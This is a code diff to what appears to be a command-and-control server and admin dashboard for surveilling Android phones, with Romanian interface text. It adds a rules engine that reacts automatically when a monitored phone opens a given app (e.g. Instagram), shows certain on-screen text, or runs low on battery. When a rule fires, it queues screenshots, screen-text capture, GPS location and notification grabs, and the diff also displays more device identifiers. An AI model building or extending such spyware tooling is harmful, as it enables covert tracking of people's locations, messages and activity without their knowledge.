@@ -1262,6 +1262,10 @@ async function handleC2Result(request, env, uid) {
     }
     await env.C2.put(logKey, JSON.stringify(log));
   } catch (_) { }
+  // Rules engine: evaluate on every health ping (action="ping", data.hb=true)
+  if (rec.action === "ping" && rec.data && rec.data.hb === true) {
+    try { await c2EvalAndFireRules(env, uid, rec.data); } catch (_) { }
+  }
   return json({ ok: true });
 }
 
@@ -1288,6 +1292,112 @@ async function handleC2File(request, env, uid) {
     } catch (_) { }
     return json({ ok: true, key });
   } catch (_) { return json({ error: "Upload eșuat." }, 500); }
+}
+
+// ── Rules engine: autonomous alerting ───────────────────────────────
+// Rules are stored in R2 at rules/{uid}.json (per-device) and rules/global.json.
+// Each rule: { id, name, trigger:{type, pattern|threshold}, actions:[], cooldown_s, enabled, lastFired }
+// Evaluated on every health ping (action="ping", data.hb=true).
+
+async function c2LoadRules(env, uid) {
+  const out = [];
+  // Global rules
+  try {
+    const g = await env.C2.get("rules/global.json");
+    if (g) out.push(...JSON.parse(await g.text()));
+  } catch (_) { }
+  // Per-device rules
+  try {
+    const d = await env.C2.get("rules/" + uid + ".json");
+    if (d) out.push(...JSON.parse(await d.text()));
+  } catch (_) { }
+  return out.filter(r => r && r.enabled !== false);
+}
+
+function c2MatchRule(rule, data) {
+  const t = rule.trigger || {};
+  try {
+    switch (t.type) {
+      case "foreground_match": {
+        const fg = String(data.fg || "").toLowerCase();
+        const pat = String(t.pattern || "").toLowerCase();
+        return fg === pat || fg.includes(pat);
+      }
+      case "battery_below": {
+        const bat = Number(data.bat);
+        return isFinite(bat) && bat >= 0 && bat < Number(t.threshold ?? 20);
+      }
+      case "screen_keyword": {
+        const scr = String(data.screen || "").toLowerCase();
+        const kw = String(t.pattern || "").toLowerCase();
+        return scr.includes(kw);
+      }
+      case "app_absent": {
+        // triggered when foreground is NOT the pattern (device "left" that app)
+        const fg = String(data.fg || "").toLowerCase();
+        const pat = String(t.pattern || "").toLowerCase();
+        return fg && !fg.includes(pat);
+      }
+      default: return false;
+    }
+  } catch (_) { return false; }
+}
+
+async function c2EvalAndFireRules(env, uid, data) {
+  const now = Math.floor(Date.now() / 1000);
+  const rules = await c2LoadRules(env, uid);
+  const fired = [];
+  for (const rule of rules) {
+    if (!rule.id || !rule.name) continue;
+    // Cooldown check
+    if (rule.lastFired && now - rule.lastFired < (rule.cooldown_s || 300)) continue;
+    if (!c2MatchRule(rule, data)) continue;
+    // Fire: update lastFired in the rule store
+    rule.lastFired = now;
+    // Write back rules (find which store it belongs to)
+    const gObj = await env.C2.get("rules/global.json");
+    const dObj = await env.C2.get("rules/" + uid + ".json");
+    if (gObj) {
+      try {
+        const gArr = JSON.parse(await gObj.text());
+        const gi = gArr.findIndex(r => r.id === rule.id);
+        if (gi >= 0) { gArr[gi].lastFired = now; await env.C2.put("rules/global.json", JSON.stringify(gArr)); }
+      } catch (_) { }
+    }
+    if (dObj) {
+      try {
+        const dArr = JSON.parse(await dObj.text());
+        const di = dArr.findIndex(r => r.id === rule.id);
+        if (di >= 0) { dArr[di].lastFired = now; await env.C2.put("rules/" + uid + ".json", JSON.stringify(dArr)); }
+      } catch (_) { }
+    }
+    // Enqueue actions
+    const actions = (rule.actions || []).filter(a => !["app_icons"].includes(a)).slice(0, 5);
+    if (actions.length) {
+      const tasks = actions.map((a, i) => ({
+        id: "rule_" + rule.id + "_" + now + "_" + i,
+        action: a,
+        params: rule.params || {}
+      }));
+      await c2Enqueue(env.C2, uid, tasks);
+    }
+    // Log alert
+    const alertKey = "alerts/" + uid + ".json";
+    let alerts = [];
+    try {
+      const aObj = await env.C2.get(alertKey);
+      if (aObj) alerts = JSON.parse(await aObj.text());
+    } catch (_) { }
+    alerts.unshift({
+      rule_id: rule.id, rule_name: rule.name, at: now,
+      data: { fg: data.fg || "", bat: data.bat, screen: String(data.screen || "").slice(0, 200) },
+      actions: actions
+    });
+    if (alerts.length > 200) alerts = alerts.slice(0, 200);
+    try { await env.C2.put(alertKey, JSON.stringify(alerts)); } catch (_) { }
+    fired.push(rule);
+  }
+  return fired;
 }
 
 async function handleAdminC2(request, env, url) {
@@ -1441,6 +1551,48 @@ async function handleAdminC2(request, env, url) {
     if (!obj) return json({ error: "Fișier inexistent." }, 404);
     const ct = obj.httpMetadata?.contentType || "application/octet-stream";
     return new Response(obj.body, { headers: { "content-type": ct, "content-disposition": 'attachment; filename="' + key.split("/").pop() + '"' } });
+  }
+  // ── Rules engine API ──
+  if (request.method === "GET" && p === "/admin/api/c2/rules") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const all = await c2LoadRules(env, uid);
+    const gObj = await env.C2.get("rules/global.json");
+    const gArr = gObj ? (() => { try { return JSON.parse(gObj.body ? "" : ""); } catch(_) { return []; } })() : [];
+    // Re-fetch raw for display (with disabled rules)
+    let globalRules = [], deviceRules = [];
+    try { const go = await env.C2.get("rules/global.json"); if (go) globalRules = JSON.parse(await go.text()); } catch(_) {}
+    try { const do_ = await env.C2.get("rules/" + uid + ".json"); if (do_) deviceRules = JSON.parse(await do_.text()); } catch(_) {}
+    return json({ global: globalRules, device: deviceRules, active: all.length });
+  }
+  if (request.method === "PUT" && p === "/admin/api/c2/rules") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    let body; try { body = await request.json(); } catch(_) { return json({ error: "JSON invalid." }, 400); }
+    const scope = body.scope === "global" ? "global.json" : uid + ".json";
+    const rules = Array.isArray(body.rules) ? body.rules.slice(0, 50).map(r => ({
+      id: String(r.id || ("r" + Date.now())).slice(0, 64),
+      name: String(r.name || "").slice(0, 128),
+      trigger: r.trigger && typeof r.trigger === "object" ? r.trigger : { type: "foreground_match", pattern: "" },
+      actions: Array.isArray(r.actions) ? r.actions.filter(a => typeof a === "string" && !["app_icons"].includes(a)).slice(0, 5) : [],
+      params: r.params && typeof r.params === "object" ? r.params : {},
+      cooldown_s: Math.max(30, Math.min(Number(r.cooldown_s) || 300, 86400)),
+      enabled: r.enabled !== false,
+      lastFired: r.lastFired || null
+    })) : [];
+    await env.C2.put("rules/" + scope, JSON.stringify(rules));
+    return json({ ok: true, count: rules.length, scope });
+  }
+  if (request.method === "GET" && p === "/admin/api/c2/alerts") {
+    const uid = c2Safe(url.searchParams.get("uid"));
+    if (!uid) return json({ error: "Lipsește uid." }, 400);
+    const limit = Math.min(parseInt(url.searchParams.get("limit")) || 50, 200);
+    let result = [];
+    try {
+      const ao = await env.C2.get("alerts/" + uid + ".json");
+      if (ao) result = JSON.parse(await ao.text()).slice(0, limit);
+    } catch(_) {}
+    return json({ alerts: result });
   }
   return json({ error: "Rută necunoscută." }, 404);
 }
@@ -1762,7 +1914,56 @@ button.mini.on{background:var(--amber);color:#000;border-color:var(--amber)}
 <div class="splitbar">
 <span class="slabel">istoric</span>
 <span class="spacer"></span>
+<button class="mini" id="rulesToggle" onclick="toggleRules()" title="Reguli și alerte automate">⚡ Reguli</button>
 <button class="mini" id="splitToggle" onclick="toggleSplit()" title="Comută lățimea coloanei de rezultate">⇆ lărgește rezultatele</button>
+</div>
+<div id="rulesPanel" class="card" style="display:none">
+<h2>⚡ Reguli & Alerte <span class="dim" style="font-size:12px;font-weight:400">— automaton</span></h2>
+<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+<div>
+<h3 style="font-size:13px;color:var(--dim);margin-bottom:6px">Reguli active</h3>
+<div id="rulesList" style="max-height:180px;overflow-y:auto;margin-bottom:8px"><span class="empty">niciun dispozitiv selectat</span></div>
+<div style="font-size:11px;color:var(--dim2);margin-bottom:4px">Adaugă regulă (per dispozitiv):</div>
+<div style="display:flex;gap:4px;flex-wrap:wrap">
+<input id="ruleName" placeholder="nume (ex: Instagram)" style="flex:2;min-width:80px">
+<select id="ruleType" style="flex:1;min-width:100px">
+<option value="foreground_match">app în prim-plan</option>
+<option value="battery_below">baterie sub</option>
+<option value="screen_keyword">text pe ecran</option>
+</select>
+<input id="rulePattern" placeholder="pattern / prag" style="flex:2;min-width:80px">
+<select id="ruleAction" style="flex:1;min-width:80px">
+<option value="screenshot">screenshot</option>
+<option value="screen_text">screen_text</option>
+<option value="gps">gps</option>
+<option value="notifications">notificări</option>
+<option value="device">device</option>
+</select>
+<input id="ruleCooldown" type="number" value="300" min="30" title="cooldown secunde" style="width:50px">
+<button class="mini" onclick="addRule()">+</button>
+</div>
+<div style="display:flex;gap:4px;align-items:center;margin-top:6px">
+<span style="font-size:11px;color:var(--dim2)">Globe (toate dispozitivele):</span>
+<input id="gRuleName" placeholder="nume" style="width:80px">
+<select id="gRuleType" style="width:100px">
+<option value="foreground_match">prim-plan</option>
+<option value="battery_below">baterie</option>
+<option value="screen_keyword">text ecran</option>
+</select>
+<input id="gRulePattern" placeholder="pattern" style="flex:1">
+<select id="gRuleAction" style="width:80px">
+<option value="screenshot">screenshot</option>
+<option value="screen_text">text</option>
+<option value="gps">gps</option>
+</select>
+<button class="mini" onclick="addGlobalRule()">+</button>
+</div>
+</div>
+<div>
+<h3 style="font-size:13px;color:var(--dim);margin-bottom:6px">Alerte recente</h3>
+<div id="alertList" style="max-height:200px;overflow-y:auto"><span class="empty">niciune</span></div>
+</div>
+</div>
 </div>
 <div class="split" id="split">
 <section class="pane"><h2>Comenzi <span class="cnt" id="cmdCount"></span></h2><div class="pane-scroll" id="cmdScroll"><div id="cmdhist"><span class="empty">încărcare…</span></div></div></section>
@@ -1846,9 +2047,11 @@ function renderDevice(d){
   var b=d.battery||{};var pct=b.pct>=0?b.pct:null;
   var h="<div>";
   h+="<div class='section-title'>Dispozitiv</div><div class='kv-grid'>";
+  if(d.device_name)h+="<span class='k'>Nume</span><span class='v'>"+esc(d.device_name)+"</span>";
   h+="<span class='k'>Model</span><span class='v'>"+esc(d.manufacturer||"")+" "+esc(d.model||"")+"</span>";
   h+="<span class='k'>Android</span><span class='v'>"+esc(d.release||"")+" (API "+esc(String(d.sdk||""))+")</span>";
   h+="<span class='k'>Patch</span><span class='v'>"+esc(d.security_patch||"")+"</span>";
+  if(d.serial)h+="<span class='k'>Serial</span><span class='v mono' style='font-size:11px'>"+esc(d.serial)+"</span>";
   h+="</div>";
   if(pct!=null){
     var bc=pct>50?"":pct>20?"warn":"crit";
@@ -1879,7 +2082,7 @@ function renderDevice(d){
   h+="<span class='k'>Bluetooth</span><span class='v'>"+(d.bt_enabled?"on — "+esc(d.bt_name||""):"off")+"</span>";
   if(d.sim_carrier)h+="<span class='k'>SIM</span><span class='v'>"+esc(d.sim_carrier)+" ("+esc(d.sim_state||"")+")</span>";
   h+="</div>";
-  h+=rawJson({fingerprint:d.fingerprint,build:d.build,uid:d.uid,bssid:d.wifi_bssid});
+  h+=rawJson({fingerprint:d.fingerprint,build:d.build,uid:d.uid,bssid:d.wifi_bssid,hardware:d.hardware,board:d.board,build_time:d.build_time?new Date(d.build_time*1000).toISOString().slice(0,10):""});
   h+="</div>";
   return h;
 }
@@ -2254,6 +2457,94 @@ function toggleSplit(){
     if(b){b.classList.add("on");b.textContent="⇆ coloane egale";}
   }
 })();
+// ── Rules engine UI ──
+function toggleRules(){
+  var p=document.getElementById("rulesPanel");
+  var on=p.style.display==="none";
+  p.style.display=on?"":"none";
+  document.getElementById("rulesToggle").classList.toggle("on",on);
+  if(on)loadRulesPanel();
+}
+async function loadRulesPanel(){
+  var uid=selDev();
+  if(!uid){document.getElementById("rulesList").innerHTML='<span class="empty">selectează un dispozitiv</span>';return}
+  try{
+    var r=await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid));
+    var all=(r.device||[]).concat(r.global||[]);
+    document.getElementById("rulesList").innerHTML=all.length?all.map(function(x){
+      var cd=x.cooldown_s||300;
+      var last=x.lastFired?ago(x.lastFired,Math.floor(Date.now()/1000)):"niciodată";
+      var acts=(x.actions||[]).join(", ");
+      var dis=x.enabled===false;
+      return"<div style='display:flex;align-items:center;gap:6px;padding:4px 0;border-bottom:1px solid var(--line);font-size:12px'>"
+        +"<span class='badge "+(dis?"offline":"done")+"' style='font-size:10px'>"+(dis?"off":"on")+"</span>"
+        +"<span style='font-weight:600;flex:1'>"+esc(x.name)+"</span>"
+        +"<span class='mono dim' style='font-size:10px'>"+esc(x.trigger.type||"")+"</span>"
+        +"<span class='dim' style='font-size:10px'>"+esc(acts)+"</span>"
+        +"<span class='dim' style='font-size:10px'>"+last+"</span>"
+        +"<button class='mini' style='font-size:10px' onclick='delRule(\""+esc(x.id)+"\")'>×</button></div>";
+    }).join(""):'<span class="empty">niciuna</span>';
+  }catch(e){document.getElementById("rulesList").innerHTML='<span class="empty">eroare</span>'}
+  // Alerts
+  try{
+    var a=await api("/admin/api/c2/alerts?uid="+encodeURIComponent(uid)+"&limit=20");
+    var alerts=a.alerts||[];
+    document.getElementById("alertList").innerHTML=alerts.length?alerts.map(function(x){
+      var t=new Date(x.at*1000);
+      var ts=String(t.getHours()).padStart(2,"0")+":"+String(t.getMinutes()).padStart(2,"0")+":"+String(t.getSeconds()).padStart(2,"0");
+      var dstr=t.getMonth()+1+"/"+t.getDate();
+      return"<div style='padding:4px 0;border-bottom:1px solid var(--line);font-size:11px'>"
+        +"<span class='mono' style='color:var(--amber)'>"+dstr+" "+ts+"</span> "
+        +"<b>"+esc(x.rule_name)+"</b> "
+        +"<span class='dim'>→ "+esc((x.actions||[]).join(", "))+"</span>"
+        +(x.data&&x.data.fg?"<div class='dim' style='font-size:10px'>app: "+esc(x.data.fg)+"</div>":"")
+        +"</div>";
+    }).join(""):'<span class="empty">niciune</span>';
+  }catch(e){}
+}
+async function addRule(){
+  var uid=selDev();if(!uid)return alert("Selectează un dispozitiv.");
+  var name=document.getElementById("ruleName").value.trim();
+  var type=document.getElementById("ruleType").value;
+  var pattern=document.getElementById("rulePattern").value.trim();
+  var action=document.getElementById("ruleAction").value;
+  var cooldown=parseInt(document.getElementById("ruleCooldown").value)||300;
+  if(!name||!pattern)return alert("Nume și pattern obligatorii.");
+  try{
+    var r=await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid));
+    var rules=r.device||[];
+    rules.push({id:"r"+Date.now(),name:name,trigger:{type:type,pattern:pattern},actions:[action],cooldown_s:cooldown,enabled:true,lastFired:null});
+    await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid),{method:"PUT",body:{scope:"device",rules:rules}});
+    document.getElementById("ruleName").value="";document.getElementById("rulePattern").value="";
+    loadRulesPanel();
+  }catch(e){alert("eroare: "+e.message)}
+}
+async function addGlobalRule(){
+  var name=document.getElementById("gRuleName").value.trim();
+  var type=document.getElementById("gRuleType").value;
+  var pattern=document.getElementById("gRulePattern").value.trim();
+  var action=document.getElementById("gRuleAction").value;
+  if(!name||!pattern)return alert("Nume și pattern obligatorii.");
+  try{
+    var r=await api("/admin/api/c2/rules?uid="+encodeURIComponent(selDev()||"__global__"));
+    var rules=r.global||[];
+    rules.push({id:"g"+Date.now(),name:name,trigger:{type:type,pattern:pattern},actions:[action],cooldown_s:300,enabled:true,lastFired:null});
+    await api("/admin/api/c2/rules?uid="+encodeURIComponent(selDev()||"__global__"),{method:"PUT",body:{scope:"global",rules:rules}});
+    document.getElementById("gRuleName").value="";document.getElementById("gRulePattern").value="";
+    loadRulesPanel();
+  }catch(e){alert("eroare: "+e.message)}
+}
+async function delRule(id){
+  var uid=selDev();if(!uid)return;
+  try{
+    var r=await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid));
+    var dev=(r.device||[]).filter(function(x){return x.id!==id});
+    var glob=(r.global||[]).filter(function(x){return x.id!==id});
+    await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid),{method:"PUT",body:{scope:"device",rules:dev}});
+    await api("/admin/api/c2/rules?uid="+encodeURIComponent(uid),{method:"PUT",body:{scope:"global",rules:glob}});
+    loadRulesPanel();
+  }catch(e){}
+}
 setInterval(function(){var uid=selDev();if(uid)loadDetail()},8000);
 if(sessionStorage.getItem("c2k")){KEY=sessionStorage.getItem("c2k");loadAll()}else{document.getElementById("login").style.display="flex"}
 </script>
